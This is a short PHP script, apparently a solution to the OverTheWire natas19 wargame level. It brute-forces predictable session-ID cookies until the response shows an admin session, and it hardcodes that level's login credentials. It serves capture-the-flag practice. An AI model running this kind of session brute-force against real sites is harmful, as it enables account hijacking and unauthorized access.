<?php

/* Annahme: Die Session Id besteht aus einem Muster, bei welchem der Tail 2d61646d696e immer gleich ist.
	Die Zahlenspannweite geht von 3 bis 353030. Wir testen NICHT sequentiell sondern nach dem Muster.
	Immer einmal 3 'Request' dann 0-9 'Request' dann wieder ne 3 Request. Kein gezähle sondern kombininationen.
	
	Denkfehler: Für jede neue Ziffer müssen ja alle bereits rotierten Ziffern wieder rotiert werden
 */

$tail = "2d61646d696e";

$url= "http://natas19.natas.labs.overthewire.org/";
$cred= "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr";
$ch= curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_USERPWD, $cred);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST,1);


# Url neuladen
curl_setopt($ch,CURLOPT_URL, $url);
$payload = "PHPSESSID=3";
curl_setopt($ch, CURLOPT_COOKIE, $payload.$tail);
curl_setopt($ch, CURLOPT_POSTFIELDS, "admin");
$res = curl_exec($ch);
$op_len=strlen($res);
if($op_len != 1307){
	echo $res;
}
echo $op_len;

for($i=0; $i < 60000; $i++){
	
	# Seite neuladen
	$sessionID = sprintf("%s%d%s",$payload, $i, $tail);
	echo "$sessionID\n";
	curl_setopt($ch, CURLOPT_COOKIE, $sessionID);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "admin");
	$res = curl_exec($ch);
	
	$len = strlen($res);
	echo"len '$len'\n";
	if(strstr($res, "are an admin.")){
		echo "$res\n";
		break;
	}
	
curl_setopt($ch,CURLOPT_URL, $url);
}
curl_close($ch);

?>


